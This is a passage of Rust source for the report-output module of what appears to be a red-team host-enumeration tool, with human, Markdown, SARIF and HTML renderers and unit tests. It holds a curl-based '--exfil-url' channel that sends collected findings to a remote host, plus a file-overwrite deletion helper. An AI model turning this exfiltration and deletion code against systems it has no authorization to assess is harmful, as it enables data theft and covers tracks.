use anyhow::{bail, Context, Result};
use std::ffi::OsStr;
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};
use zeroize::Zeroize;

use crate::cli::{OutputMode, ReportFormat};
use crate::core::store::EncryptedStore;
use crate::core::term;
use crate::core::types::{Finding, RunReport, Severity};

pub struct OutputOptions {
    pub mode: OutputMode,
    pub path: Option<std::path::PathBuf>,
    pub key_output_path: Option<std::path::PathBuf>,
    pub plaintext_file: bool,
    pub also_markdown: bool,
    pub exfil_url: Option<String>,
    pub quiet: bool,
    pub summary: bool,
    pub progress_json: bool,
    pub format: ReportFormat,
    pub min_severity: Severity,
    #[allow(dead_code)]
    pub run_id: String,
    #[allow(dead_code)]
    pub ledger_dir: std::path::PathBuf,
}

pub struct EmitResult {
    /// Highest severity among findings that passed the display filter (Info if none).
    pub max_severity: Severity,
}

pub fn emit(
    report: &RunReport,
    store: &EncryptedStore,
    opts: &OutputOptions,
) -> Result<EmitResult> {
    if ((opts.mode == OutputMode::File && !opts.plaintext_file) || opts.mode == OutputMode::Remote)
        && opts.key_output_path.is_none()
    {
        bail!(
            "encrypted output requires --key-output-path (or STEALTHY_KEY_OUTPUT_PATH); keys are never printed to stderr"
        );
    }
    let filtered = filter_findings(&report.findings, opts.min_severity);
    let max_severity = filtered
        .iter()
        .map(|f| f.severity)
        .max()
        .unwrap_or(Severity::Info);
    let shown = filtered.len();
    let total = report.findings.len();

    // Machine formats always go to stdout (even with -q). Human report respects quiet.
    match opts.format {
        ReportFormat::Human => {
            if !opts.quiet {
                if opts.summary {
                    print_summary(report, &filtered, total);
                } else {
                    print_human(report, &filtered, total);
                }
            }
        }
        ReportFormat::Json => {
            let mut view = report.clone();
            view.findings = filtered.iter().map(|f| (*f).clone()).collect();
            println!("{}", render_json(&view, &filtered)?);
        }
        ReportFormat::Markdown => {
            print!("{}", render_markdown(report, &filtered, total));
        }
        ReportFormat::Sarif => {
            println!("{}", render_sarif(report, &filtered));
        }
    }

    match opts.mode {
        OutputMode::Memory => {
            if opts.plaintext_file {
                anyhow::bail!("--plaintext-file requires --output=file");
            }
            if opts.also_markdown {
                anyhow::bail!("--also-markdown requires --output=file");
            }
            if !opts.quiet && matches!(opts.format, ReportFormat::Human) {
                eprintln!(
                    "\n{} {} finding(s) in memory ({} shown) · nothing written to disk",
                    term::dim("[memory]"),
                    total,
                    shown
                );
            }
        }
        OutputMode::File => {
            let path = opts
                .path
                .as_ref()
                .ok_or_else(|| anyhow::anyhow!("--output=file requires --output-path"))?;
            write_file(report, store, path, opts.plaintext_file)?;
            if !opts.plaintext_file {
                let key_path = opts.key_output_path.as_ref().expect("validated key path");
                if key_path == path {
                    bail!("--key-output-path must differ from --output-path");
                }
                let mut key = store.key_hex();
                let result = write_sensitive_file(key_path, key.as_bytes());
                key.zeroize();
                result?;
            }
            if !opts.quiet {
                eprintln!("{} wrote {}", term::ok("[file]"), path.display());
                if !opts.plaintext_file {
                    let key_path = opts.key_output_path.as_ref().expect("validated key path");
                    eprintln!(
                        "{} wrote protected report key {}",
                        term::warn("[key]"),
                        key_path.display()
                    );
                }
                eprintln!(
                    "{} Keep the sealed report and key in separate approved locations; the Markdown sidecar is plaintext evidence.",
                    term::dim("[next]")
                );
            }
            if opts.also_markdown {
                let md_path = std::path::PathBuf::from(format!("{}.md", path.display()));
                let md = render_markdown(report, &filtered, total);
                crate::core::artifacts::write_private_atomic(&md_path, md.as_bytes())
                    .with_context(|| format!("write {}", md_path.display()))?;
                if !opts.quiet {
                    eprintln!("{} wrote {}", term::ok("[file]"), md_path.display());
                }
            }
        }
        OutputMode::Remote => {
            let url = opts
                .exfil_url
                .as_ref()
                .ok_or_else(|| anyhow::anyhow!("--output=remote requires --exfil-url"))?;
            validate_remote_url(url)?;
            let sealed = store.seal_report(report)?;
            let key_path = opts.key_output_path.as_ref().expect("validated key path");
            let mut key = store.key_hex();
            let result = write_sensitive_file(key_path, key.as_bytes());
            key.zeroize();
            result?;
            post_remote(url, &sealed).with_context(|| {
                format!(
                    "remote delivery failed; protected report key retained at {}",
                    key_path.display()
                )
            })?;
            if !opts.quiet {
                eprintln!(
                    "{} delivered encrypted report to {}",
                    term::ok("[remote]"),
                    url
                );
                eprintln!(
                    "{} wrote protected report key {}",
                    term::warn("[key]"),
                    key_path.display()
                );
            }
        }
    }

    let _ = (shown, total);
    Ok(EmitResult { max_severity })
}

pub(crate) fn validate_remote_url(url: &str) -> Result<()> {
    if url.chars().any(char::is_whitespace) {
        bail!("--exfil-url must not contain whitespace");
    }
    let scheme = url
        .get(..8)
        .filter(|scheme| scheme.eq_ignore_ascii_case("https://"));
    if scheme.is_none() {
        bail!("--exfil-url must use an absolute https:// URL");
    }
    let authority = url[8..].split(['/', '?', '#']).next().unwrap_or_default();
    if authority.is_empty() {
        bail!("--exfil-url must include a destination host");
    }
    Ok(())
}

fn post_remote(url: &str, sealed: &str) -> Result<()> {
    post_remote_with(OsStr::new("curl"), url, sealed)
}

fn post_remote_with(program: &OsStr, url: &str, sealed: &str) -> Result<()> {
    #[cfg(windows)]
    const NULL_DEVICE: &str = "NUL";
    #[cfg(not(windows))]
    const NULL_DEVICE: &str = "/dev/null";

    let mut child = Command::new(program)
        .args([
            "--proto",
            "=https",
            "--tlsv1.2",
            "--fail",
            "--silent",
            "--show-error",
            "--connect-timeout",
            "10",
            "--max-time",
            "30",
            "--request",
            "POST",
            "--header",
            "Content-Type: application/octet-stream",
            "--output",
            NULL_DEVICE,
            "--write-out",
            "%{http_code}",
            "--data-binary",
            "@-",
            url,
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("start curl HTTPS client; install curl or use --output=file")?;
    child
        .stdin
        .take()
        .context("open curl request body")?
        .write_all(sealed.as_bytes())
        .context("write encrypted remote request body")?;
    let output = child
        .wait_with_output()
        .context("wait for curl HTTPS client")?;
    if !output.status.success() {
        let detail = String::from_utf8_lossy(&output.stderr)
            .trim()
            .chars()
            .take(512)
            .collect::<String>();
        let code = output.status.code().map_or_else(
            || "terminated by signal".to_string(),
            |code| code.to_string(),
        );
        if detail.is_empty() {
            bail!("curl exited with status {code}");
        }
        bail!("curl exited with status {code}: {detail}");
    }
    let status = String::from_utf8_lossy(&output.stdout);
    let status = status.trim();
    if !matches!(status.parse::<u16>(), Ok(200..=299)) {
        bail!("remote endpoint returned HTTP status {status}");
    }
    Ok(())
}

/// Render a JSON report with derived operator guidance fields.
///
/// `recommendation` remains unchanged for compatibility. The derived fields
/// make the human-facing contract available to automation as well.
pub fn render_json(report: &RunReport, findings: &[&Finding]) -> Result<String> {
    let mut view = serde_json::to_value(report)?;
    if let Some(serialized_findings) = view
        .get_mut("findings")
        .and_then(serde_json::Value::as_array_mut)
    {
        for (serialized, finding) in serialized_findings.iter_mut().zip(findings) {
            serialized["what_next"] = serde_json::json!(finding.what_next());
            serialized["next_command"] = serde_json::json!(finding.next_command());
            serialized["remediation"] = serde_json::json!({
                "prerequisite": "Confirm the finding against the current account, host, and approved ROE.",
                "verification": finding.next_command(),
                "rollback": "No change is made by this verification command; record any approved remediation and preserve the prior state."
            });
        }
    }
    Ok(serde_json::to_string_pretty(&view)?)
}

fn print_summary(report: &RunReport, findings: &[&Finding], total: usize) {
    let max = findings.iter().map(|f| f.severity).max();
    let failed = report.coverage.iter().filter(|c| c.status != "ok").count();
    let status = if failed > 0 || !report.capability_delta.is_empty() {
        term::warn("REVIEW REQUIRED")
    } else if findings.is_empty() {
        term::ok("NO FINDINGS IN SCOPE")
    } else {
        term::warn("ACTION REQUIRED")
    };
    println!(
        "{} {}  {}",
        term::bold(crate::core::opsec::BRAND),
        term::dim("summary"),
        status
    );
    println!("{}", term::dim("─".repeat(64).as_str()));
    println!(
        "{} {}@{} · {} · {}",
        term::bold("Target:"),
        report.identity.username,
        report.identity.hostname,
        report.os.os,
        report.profile
    );
    println!(
        "{} {} · {} plugin(s) · run={}",
        term::bold("Scan:"),
        report.mode,
        report.plugins_run.len(),
        if report.run_id.is_empty() {
            "not recorded"
        } else {
            &report.run_id
        }
    );
    println!(
        "{} {} finding(s) · {} shown · max={}",
        term::bold("Results:"),
        total,
        findings.len(),
        max.map(|s| s.as_str()).unwrap_or("none")
    );
    println!(
        "{} {} · {} reduced-capability item(s)",
        term::bold("Coverage:"),
        if failed == 0 {
            term::ok("complete")
        } else {
            term::err(&format!("{failed} issue(s)"))
        },
        report.capability_delta.len()
    );
    println!("{}", term::dim("─".repeat(64).as_str()));
    println!("{}", term::bold("Top priorities"));
    if findings.is_empty() {
        println!(
            "  {} Review coverage, then rerun focused plugins before declaring the host clean.",
            term::ok("1.")
        );
    }
    for (index, finding) in findings.iter().take(3).enumerate() {
        println!(
            "  {} {} {} — {}",
            term::bold(&format!("{}.", index + 1)),
            term::severity_tag(finding.severity),
            finding.title,
            finding.what_next()
        );
    }
    if !findings.is_empty() {
        println!(
            "\n{} {}",
            term::green("Next command:"),
            findings[0].next_command()
        );
    }
    if failed > 0 || !report.capability_delta.is_empty() {
        println!("\n{} Empty results are not proof of a clean host; inspect coverage before closing the assessment.", term::warn("Note:"));
    }
}

/// Self-contained offline HTML report. Evidence is escaped and placed in
/// native disclosure widgets so opening the file never executes report data.
pub fn render_html(report: &RunReport, findings: &[&Finding]) -> String {
    let counts = count_by_severity(findings);
    let esc = |s: &str| {
        s.replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
    };
    let colors = ["#64748b", "#22c55e", "#eab308", "#f97316", "#ef4444"];
    let mut bars = String::new();
    for (i, label) in ["Info", "Low", "Medium", "High", "Critical"]
        .iter()
        .enumerate()
    {
        bars.push_str(&format!("<div class=bar><span>{label}</span><i style=\"width:{}%;background:{}\"></i><b>{}</b></div>", (counts[i] * 100).max(1), colors[i], counts[i]));
    }
    let mut body = String::new();
    for f in findings {
        body.push_str(&format!("<details class=\"finding\"><summary><strong>{}</strong> <em>{}</em> <code>{}</code></summary><p>{}</p><p><strong>Why:</strong> {} observed the condition on <code>{}</code>.</p><p><strong>Remediation:</strong> {}</p><p><strong>Safe verification:</strong> <code>{}</code> <button onclick=\"navigator.clipboard.writeText(this.previousElementSibling.textContent)\">Copy</button></p></details>", esc(&f.title), f.severity.as_str(), esc(&f.finding_id), esc(&f.detail), esc(&f.plugin), esc(&f.object), esc(&f.recommendation), esc(&f.next_command())));
    }
    if body.is_empty() {
        body.push_str("<p class=empty>No findings match the current report.</p>");
    }
    let mut paths = String::new();
    for path in &report.attack_paths {
        use std::fmt::Write as _;
        write!(
            &mut paths,
            "<li><strong>{}</strong> — {} <small>(noise: {})</small></li>",
            esc(&path.title),
            esc(&path.summary),
            esc(&path.estimated_noise)
        )
        .expect("writing HTML to a String cannot fail");
    }
    let brand = crate::core::opsec::BRAND;
    format!("<!doctype html><meta charset=utf-8><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>{brand} report</title><style>body{{font:15px system-ui;max-width:1000px;margin:2rem auto;padding:0 1rem;color:#172033;background:#f8fafc}}h1{{color:#0f766e}}.card{{border:1px solid #dbe4ee;background:white;border-radius:10px;padding:1rem;margin:1rem 0;box-shadow:0 2px 8px #0f172a0a}}.toolbar{{position:sticky;top:0;z-index:2;background:#fffffff2;backdrop-filter:blur(8px)}}.bar{{display:flex;gap:.6rem;align-items:center;margin:.45rem 0}}.bar span{{width:75px}}.bar i{{height:14px;border-radius:5px;display:inline-block;max-width:70%}}.bar b{{margin-left:.4rem}}details{{border-top:1px solid #dbe4ee;padding:.8rem}}summary{{cursor:pointer}}em{{font-style:normal;text-transform:uppercase;font-size:.75rem;color:#b45309}}code{{background:#f1f5f9;padding:.15rem .3rem;border-radius:4px;white-space:pre-wrap}}small{{color:#64748b}}button,input,select{{padding:.45rem;margin:.2rem;border:1px solid #cbd5e1;border-radius:6px;background:white}}button{{cursor:pointer}}.empty{{color:#64748b;padding:1rem}}</style><h1>{brand} report</h1><div class=card><b>Host:</b> {} &nbsp; <b>User:</b> {} &nbsp; <b>OS:</b> {} / {}<br><b>Mode:</b> {} &nbsp; <b>Coverage:</b> {} &nbsp; <b>Plugins:</b> {}</div><div class=card><h2>Severity summary</h2>{bars}</div><div class=card><h2>Attack paths</h2><ul>{paths}</ul></div><div class=\"card toolbar\"><h2>Findings</h2><input id=search placeholder=\"Search findings\" aria-label=\"Search findings\"><select id=severity aria-label=\"Filter by severity\"><option value=\"\">All severities</option><option>critical</option><option>high</option><option>medium</option><option>low</option><option>info</option></select><button id=expand onclick=\"document.querySelectorAll('.finding').forEach(x=>x.open=true)\">Expand all</button><button onclick=\"document.querySelectorAll('.finding').forEach(x=>x.open=false)\">Collapse all</button>{body}</div><div class=card><h2>Coverage gaps</h2><p>{}</p></div><script>const apply=()=>{{const q=document.querySelector('#search').value.toLowerCase(),s=document.querySelector('#severity').value;document.querySelectorAll('.finding').forEach(x=>{{const text=x.textContent.toLowerCase(),sev=x.querySelector('em').textContent; x.style.display=(!q||text.includes(q))&&(!s||sev===s)?'':'none';}})}};document.querySelector('#search').oninput=apply;document.querySelector('#severity').onchange=apply;</script>", esc(&report.identity.hostname), esc(&report.identity.username), esc(&report.os.os), esc(&report.os.arch), esc(&report.mode), esc(&report.coverage_mode), report.plugins_run.len(), if report.capability_delta.is_empty() { "None reported".into() } else { report.capability_delta.iter().map(|x| format!("<code>{}</code>", esc(x))).collect::<Vec<_>>().join(", ") })
}

fn filter_findings(findings: &[Finding], min: Severity) -> Vec<&Finding> {
    let mut v: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.severity.rank() >= min.rank())
        .collect();
    v.sort_by(|a, b| {
        b.severity
            .rank()
            .cmp(&a.severity.rank())
            .then_with(|| a.plugin.cmp(&b.plugin))
            .then_with(|| a.title.cmp(&b.title))
    });
    v
}

fn count_by_severity(findings: &[&Finding]) -> [usize; 5] {
    let mut c = [0usize; 5];
    for f in findings {
        c[f.severity.rank() as usize] += 1;
    }
    c
}

fn print_human(report: &RunReport, findings: &[&Finding], total: usize) {
    let counts = count_by_severity(findings);
    let bar = "─".repeat(64);

    println!("{}", term::bold(&bar));
    println!(
        "{}  {}",
        term::bold(crate::core::opsec::BRAND),
        term::dim(&format!("v{}", report.version))
    );
    println!("{}", term::bold(&bar));

    let elev = if report.identity.is_elevated {
        term::warn("elevated")
    } else {
        term::ok("user")
    };
    println!(
        "  {}  {}@{}  [{}]  {}/{}",
        term::cyan(&report.os.os),
        term::bold(&report.identity.username),
        report.identity.hostname,
        elev,
        report.os.arch,
        term::dim(&report.os.version_hint)
    );
    println!(
        "  mode={}  profile={}  plugins_run={}",
        report.mode,
        if report.profile.is_empty() {
            "balanced"
        } else {
            &report.profile
        },
        report.plugins_run.len()
    );
    println!();

    // Severity summary strip
    println!("{}", term::bold("Summary"));
    println!(
        "  {} {}  {} {}  {} {}  {} {}  {} {}   total {} (showing {})",
        term::severity_tag(Severity::Critical),
        counts[4],
        term::severity_tag(Severity::High),
        counts[3],
        term::severity_tag(Severity::Medium),
        counts[2],
        term::severity_tag(Severity::Low),
        counts[1],
        term::severity_tag(Severity::Info),
        counts[0],
        total,
        findings.len()
    );
    let coverage_errors = report
        .coverage
        .iter()
        .filter(|item| item.status != "ok")
        .count();
    if coverage_errors > 0 || !report.capability_delta.is_empty() {
        println!(
            "  {} Coverage is incomplete: {} plugin issue(s), {} reduced-capability item(s).",
            term::warn("[!]"),
            coverage_errors,
            report.capability_delta.len()
        );
        println!("      An empty finding list is not proof of a clean host.");
    } else {
        println!(
            "  {} Coverage is complete for the selected plugin set.",
            term::ok("[ok]")
        );
    }
    println!();

    if !report.attack_paths.is_empty() {
        println!("{}", term::bold("Attack paths"));
        for path in &report.attack_paths {
            println!(
                "  {}. {} — {} (noise={})",
                path.rank, path.title, path.summary, path.estimated_noise
            );
            println!(
                "       {}",
                term::dim(&format!("findings: {}", path.finding_ids.join(", ")))
            );
        }
        if let Some(first) = findings.first() {
            println!(
                "  {} {}",
                term::green("→ Next recommended action:"),
                first.what_next()
            );
        }
        println!();
    }

    if findings.is_empty() {
        println!(
            "  {}",
            term::ok("No findings at or above the selected severity filter.")
        );
        println!("  Review Coverage above, then rerun with `--min-severity info` or a focused `--plugins` selection.");
        println!();
    } else {
        println!("{}", term::bold("Findings"));
        println!("{}", term::dim("  (sorted by severity · highest first)"));
        println!();
        for (i, f) in findings.iter().enumerate() {
            print_finding(i + 1, f);
        }
    }

    if !report.notes.is_empty() {
        println!("{}", term::bold("Notes"));
        for n in &report.notes {
            println!("  {} {}", term::dim("·"), n);
        }
        println!();
    }

    if !report.coverage.is_empty() {
        println!("{}", term::bold("Coverage"));
        for coverage in &report.coverage {
            let detail = coverage
                .error
                .as_deref()
                .map(|e| format!(": {e}"))
                .unwrap_or_default();
            println!(
                "  {} {} · {} finding(s){}",
                if coverage.status == "ok" {
                    term::ok("[ok]")
                } else {
                    term::err("[error]")
                },
                coverage.id,
                coverage.findings,
                detail
            );
        }
        println!();
    }

    println!("{}", term::dim(&bar));
    println!(
        "{}",
        term::dim(
            "Authorized use only · high-impact techniques require --allow-techniques · prefer --authorized enum",
        )
    );
}

fn print_finding(idx: usize, f: &Finding) {
    println!(
        "  {}  {}  {}  {}",
        term::dim(&format!("{idx:>3}.")),
        term::severity_tag(f.severity),
        term::cyan(&f.plugin),
        term::bold(&f.title)
    );
    if !f.finding_id.is_empty() {
        println!(
            "       {} {}  exploitability={}  tti={}",
            term::dim("id"),
            f.finding_id,
            f.exploitability,
            if f.time_to_impact.is_empty() {
                "unknown"
            } else {
                &f.time_to_impact
            }
        );
    }
    if !f.mitre_techniques.is_empty() {
        println!(
            "       {} {}",
            term::dim("MITRE"),
            f.mitre_techniques.join(", ")
        );
    }
    println!("       {}", f.detail);
    println!(
        "       {} {} {}",
        term::green("→"),
        term::bold("What's next:"),
        f.what_next()
    );
    println!("       {} {}", term::dim("Command:"), f.next_command());
    let mut tags = Vec::new();
    if f.noisy {
        tags.push(term::warn("noisy"));
    }
    if f.leaves_artifacts {
        tags.push(term::warn("artifacts"));
    }
    tags.push(term::dim(&format!("{:?}", f.kind).to_ascii_lowercase()));
    if !tags.is_empty() {
        println!("       {}", tags.join("  "));
    }
    println!();
}

pub fn render_markdown(report: &RunReport, findings: &[&Finding], total: usize) -> String {
    let counts = count_by_severity(findings);
    let mut out = String::new();
    out.push_str(&format!(
        "# {} report\n\n\
         - **Version:** {}\n\
         - **Schema:** {}\n\
         - **Run ID:** `{}`\n\
         - **Host:** `{}`\n\
         - **User:** `{}` (elevated={})\n\
         - **OS:** {} / {} ({})\n\
         - **Mode:** {}\n\
         - **Execution path:** {}\n\
         - **Primary launch:** {}\n\
         - **ROE reference:** `{}`\n\
         - **Profile:** {}\n\
         - **Coverage mode:** {}\n\
         - **Plugins run:** {}\n\
         - **Findings:** {} total, {} shown\n\n",
        crate::core::opsec::BRAND,
        report.version,
        report.schema_version,
        report.run_id,
        report.identity.hostname,
        report.identity.username,
        report.identity.is_elevated,
        report.os.os,
        report.os.arch,
        report.os.version_hint,
        report.mode,
        if report.execution_path.is_empty() {
            "binary"
        } else {
            &report.execution_path
        },
        if report.primary_launch.is_empty() {
            "not_applicable"
        } else {
            &report.primary_launch
        },
        report.roe_ref,
        if report.profile.is_empty() {
            "balanced"
        } else {
            &report.profile
        },
        if report.coverage_mode.is_empty() {
            "binary"
        } else {
            &report.coverage_mode
        },
        report.plugins_run.join(", "),
        total,
        findings.len()
    ));
    if !report.attack_paths.is_empty() {
        out.push_str("## Attack paths\n\n");
        for path in &report.attack_paths {
            out.push_str(&format!(
                "{}. **{}** — {} _(noise: {})_\n  - findings: `{}`\n",
                path.rank,
                path.title,
                path.summary,
                path.estimated_noise,
                path.finding_ids.join("`, `")
            ));
        }
        out.push('\n');
    }
    if let Some(controls) = &report.control_assessment {
        out.push_str("## Application-control and telemetry assessment\n\n");
        out.push_str(&format!(
            "- Platform: `{}`\n- Collection mode: `{}`\n- Policies observed: {}\n- Sensors inventoried: {}\n- Audit sources: {}\n- Validation cases: {}\n- Telemetry behavior classes: {}\n",
            controls.platform,
            controls.collection_mode,
            controls.policies.len(),
            controls.sensors.len(),
            controls.audit_sources.len(),
            controls.validation_cases.len(),
            controls.telemetry_expectations.len()
        ));
        out.push_str(&format!(
            "- Detection exposure: `{}` ({}/100 expected-telemetry score)\n",
            controls.detection_exposure_label, controls.detection_exposure
        ));
        out.push_str(&format!(
            "- Live telemetry: `{}` ({}/100; recent event collection)\n",
            controls.live_telemetry_label, controls.live_telemetry_score
        ));
        if let Some(artifact) = &controls.artifact {
            out.push_str(&format!(
                "- Artifact: `{}` — predicted decision `{}`; sha256 `{}`; origin `{}`; signer `{}`; publisher `{}`; product `{}`; version `{}`; policy rule `{}`; path class `{}`; access control `{}`; static analysis `{}`\n",
                artifact.path,
                artifact.predicted_decision,
                artifact.sha256,
                artifact.origin,
                artifact.signer,
                artifact.publisher,
                artifact.product,
                artifact.file_version,
                artifact.policy_rule,
                artifact.path_class,
                artifact.access_control,
                artifact.static_analysis.join(" | ")
            ));
        }
        out.push_str(
            "- Detection exposure is an expected-telemetry label, not a stealth score.\n\n",
        );
    }
    out.push_str("## Severity summary\n\n");
    out.push_str("| Critical | High | Medium | Low | Info |\n| --- | --- | --- | --- | --- |\n");
    out.push_str(&format!(
        "| {} | {} | {} | {} | {} |\n\n",
        counts[4], counts[3], counts[2], counts[1], counts[0]
    ));
    let coverage_errors = report
        .coverage
        .iter()
        .filter(|item| item.status != "ok")
        .count();
    if coverage_errors > 0 || !report.capability_delta.is_empty() {
        out.push_str(&format!(
            "> **Coverage warning:** {} plugin issue(s), {} reduced-capability item(s). An empty finding list is not proof of a clean host.\n\n",
            coverage_errors,
            report.capability_delta.len()
        ));
    } else {
        out.push_str("> **Coverage:** complete for the selected plugin set.\n\n");
    }
    out.push_str("## Findings\n\n");
    if findings.is_empty() {
        out.push_str("_No findings at selected severity._\n\n");
    }
    for (i, f) in findings.iter().enumerate() {
        out.push_str(&format!(
            "### {}. [{}] {} (`{}`)\n\n\
             - **finding_id:** `{}`\n\
             - **MITRE:** {}\n\
             - **technique_id:** `{}`\n\
             - **exploitability:** {}\n\
             - **time_to_impact:** {}\n\n\
             {}\n\n\
             **What's next:** {}\n\n\
             **Command:** `{}`\n\n\
             - kind: `{:?}`\n\
             - noisy: {}\n\
             - leaves_artifacts: {}\n\n",
            i + 1,
            f.severity.as_str().to_ascii_uppercase(),
            f.title,
            f.plugin,
            f.finding_id,
            if f.mitre_techniques.is_empty() {
                "_none_".into()
            } else {
                f.mitre_techniques
                    .iter()
                    .map(|t| format!("`{t}`"))
                    .collect::<Vec<_>>()
                    .join(", ")
            },
            f.technique_id,
            f.exploitability,
            if f.time_to_impact.is_empty() {
                "unknown"
            } else {
                &f.time_to_impact
            },
            f.detail,
            f.what_next(),
            f.next_command(),
            f.kind,
            f.noisy,
            f.leaves_artifacts
        ));
    }
    if !report.notes.is_empty() {
        out.push_str("## Notes\n\n");
        for n in &report.notes {
            out.push_str(&format!("- {n}\n"));
        }
        out.push('\n');
    }
    if !report.coverage.is_empty() {
        out.push_str("## Plugin coverage\n\n| Plugin | Status | Findings | Duration (ms) | Error |\n| --- | --- | ---: | ---: | --- |\n");
        for coverage in &report.coverage {
            out.push_str(&format!(
                "| `{}` | {} | {} | {} | {} |\n",
                coverage.id,
                coverage.status,
                coverage.findings,
                coverage.duration_ms,
                coverage.error.as_deref().unwrap_or("").replace('|', "\\|")
            ));
        }
        out.push('\n');
    }
    out.push_str(
        "---\n_Authorized assessments only. High-impact techniques require --allow-techniques._\n",
    );
    out
}

pub fn render_sarif(report: &RunReport, findings: &[&Finding]) -> String {
    let results = findings
        .iter()
        .map(|finding| {
            serde_json::json!({
                "ruleId": finding.plugin,
                "level": match finding.severity {
                    Severity::Critical | Severity::High => "error",
                    Severity::Medium => "warning",
                    Severity::Low | Severity::Info => "note",
                },
                "message": { "text": format!("{}: {}", finding.title, finding.detail) },
                "properties": {
                    "severity": finding.severity.as_str(),
                    "kind": format!("{:?}", finding.kind).to_ascii_lowercase(),
                    "recommendation": finding.what_next(),
                    "what_next": finding.what_next(),
                    "next_command": finding.next_command(),
                    "noisy": finding.noisy,
                    "leaves_artifacts": finding.leaves_artifacts,
                    "finding_id": finding.finding_id,
                    "mitre_techniques": finding.mitre_techniques,
                    "technique_id": finding.technique_id,
                    "exploitability": finding.exploitability,
                }
            })
        })
        .collect::<Vec<_>>();
    serde_json::json!({
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": { "driver": {
                "name": report.tool,
                "version": report.version,
                "informationUri": crate::core::opsec::REPO_URL
            }},
            "properties": {
                "run_id": report.run_id,
                "started_at_unix": report.started_at_unix,
                "coverage": report.coverage
            },
            "results": results
        }]
    })
    .to_string()
}

fn write_file(
    report: &RunReport,
    store: &EncryptedStore,
    path: &Path,
    plaintext: bool,
) -> Result<()> {
    let contents = if plaintext {
        let findings = report.findings.iter().collect::<Vec<_>>();
        render_json(report, &findings)?.into_bytes()
    } else {
        store.seal_report(report)?.into_bytes()
    };
    crate::core::artifacts::write_private_atomic(path, &contents)
        .with_context(|| format!("create {}", path.display()))
}

fn write_sensitive_file(path: &Path, contents: &[u8]) -> Result<()> {
    let mut body = Vec::with_capacity(contents.len() + 1);
    body.extend_from_slice(contents);
    body.push(b'\n');
    crate::core::artifacts::write_private_atomic(path, &body)
        .with_context(|| format!("create protected key file {}", path.display()))
}

/// Best-effort overwrite then unlink. Not a guarantee against forensic recovery.
pub fn secure_delete_hint(path: &Path) -> Result<()> {
    if !path.exists() {
        bail!("path does not exist");
    }
    let len = std::fs::metadata(path)?.len();
    {
        let mut f = std::fs::OpenOptions::new().write(true).open(path)?;
        let chunk = vec![0u8; 4096];
        let mut remaining = len;
        while remaining > 0 {
            let n = remaining.min(chunk.len() as u64) as usize;
            f.write_all(&chunk[..n])?;
            remaining -= n as u64;
        }
        f.flush()?;
    }
    std::fs::remove_file(path)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::ingest::ingest_json;

    fn report() -> RunReport {
        ingest_json(include_str!("../../tests/fixtures/script_report_min.json")).unwrap()
    }

    fn options(mode: OutputMode, format: ReportFormat) -> OutputOptions {
        OutputOptions {
            mode,
            path: None,
            key_output_path: None,
            plaintext_file: false,
            also_markdown: false,
            exfil_url: None,
            quiet: true,
            summary: false,
            progress_json: false,
            format,
            min_severity: Severity::Info,
            run_id: "test".into(),
            ledger_dir: std::env::temp_dir(),
        }
    }

    #[test]
    fn html_escapes_evidence_and_renders_empty_sections() {
        let mut report = report();
        report.findings[0].title = "<script>alert(1)</script>".into();
        report.findings[0].detail = "a & b".into();
        let findings = report.findings.iter().collect::<Vec<_>>();
        let html = render_html(&report, &findings);
        assert!(html.contains("&lt;script&gt;"));
        assert!(!html.contains("<script>alert"));
        assert!(html.contains("a &amp; b"));
        assert!(html.contains("Coverage gaps"));
        assert!(html.contains("id=search"));
        assert!(html.contains("Expand all"));
        assert!(html.contains("aria-label=\"Search findings\""));
        assert!(html.contains("Copy"));
    }

    #[test]
    fn emit_rejects_invalid_memory_options_and_writes_plaintext() {
        let report = report();
        let store = EncryptedStore::new();
        let mut invalid = options(OutputMode::Memory, ReportFormat::Json);
        invalid.plaintext_file = true;
        assert!(emit(&report, &store, &invalid).is_err());

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("report.json");
        let mut file = options(OutputMode::File, ReportFormat::Json);
        file.path = Some(path.clone());
        file.plaintext_file = true;
        assert!(emit(&report, &store, &file).is_ok());
        let parsed: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
        assert_eq!(parsed["schema_version"], "2");
    }

    #[test]
    fn secure_delete_removes_files_and_rejects_missing_paths() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("secret");
        std::fs::write(&path, b"sensitive fixture").unwrap();
        assert!(secure_delete_hint(&path).is_ok());
        assert!(!path.exists());
        assert!(secure_delete_hint(&path).is_err());
    }

    #[test]
    fn renderers_emit_machine_and_operator_views() {
        let report = report();
        let findings = report.findings.iter().collect::<Vec<_>>();
        let markdown = render_markdown(&report, &findings, findings.len());
        assert!(markdown.contains(&format!("# {} report", crate::core::opsec::BRAND)));
        assert!(markdown.contains("What's next"));
        let sarif: serde_json::Value =
            serde_json::from_str(&render_sarif(&report, &findings)).unwrap();
        assert_eq!(sarif["version"], "2.1.0");
        assert!(!sarif["runs"][0]["results"].as_array().unwrap().is_empty());
        let json: serde_json::Value =
            serde_json::from_str(&render_json(&report, &findings).unwrap()).unwrap();
        assert!(json["findings"][0]["next_command"].is_string());
    }

    #[test]
    fn emit_supports_markdown_and_secure_file_output() {
        let report = report();
        let store = EncryptedStore::new();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("sealed.report");
        let key = dir.path().join("report.key");
        let mut opts = options(OutputMode::File, ReportFormat::Markdown);
        opts.path = Some(path.clone());
        opts.key_output_path = Some(key.clone());
        opts.format = ReportFormat::Markdown;
        opts.also_markdown = true;
        assert!(emit(&report, &store, &opts).is_ok());
        assert!(path.exists());
        assert!(key.exists());
        assert!(dir.path().join("sealed.report.md").exists());
    }

    #[test]
    fn remote_urls_require_https_and_a_host() {
        assert!(validate_remote_url("https://operator.example/ingest").is_ok());
        assert!(validate_remote_url("HTTPS://operator.example").is_ok());
        for invalid in [
            "http://operator.example/ingest",
            "https://",
            "https:///ingest",
            "operator.example/ingest",
            "https://operator.example/bad path",
        ] {
            assert!(validate_remote_url(invalid).is_err(), "accepted {invalid}");
        }
    }

    #[cfg(unix)]
